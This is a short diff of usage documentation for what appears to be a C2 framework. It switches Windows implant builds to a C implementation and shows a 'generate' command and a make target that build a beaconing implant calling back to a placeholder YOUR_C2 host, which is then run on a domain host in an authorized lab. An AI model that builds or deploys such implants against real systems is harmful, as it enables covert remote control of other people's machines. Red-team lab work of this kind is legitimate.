@@ -36,18 +36,19 @@ cp config/agent.yaml.example ~/.erebus/agent.yaml   # optional
 # Ensure approver.pem exists (created by serve)
 ```
 
-### Build Windows implant (interactive sleep)
+### Build Windows implant (C primary; interactive sleep)
 
 ```bash
-# From operator REPL after serve:
+# From operator REPL after serve (default language is c for Windows PE):
 generate --os windows --arch amd64 --sleep 500 --jitter 10 \
   --callback https://YOUR_C2:443 --out ./implant.exe
+# Explicit: --language c   |  Linux peer: --language go --os linux
 
 # Or make:
-make implant-win CALLBACK_URL=https://YOUR_C2:443 SLEEP_MS=500 JITTER_PCT=10
+make implant-c CALLBACK_URL=https://YOUR_C2:443 SLEEP_MS=500 JITTER_PCT=10
 ```
 
-Copy `implant.exe` to domain host and run (authorized lab only).
+Copy `implant.exe` / `implant_c.exe` to domain host and run (authorized lab only).
 
 ---
 
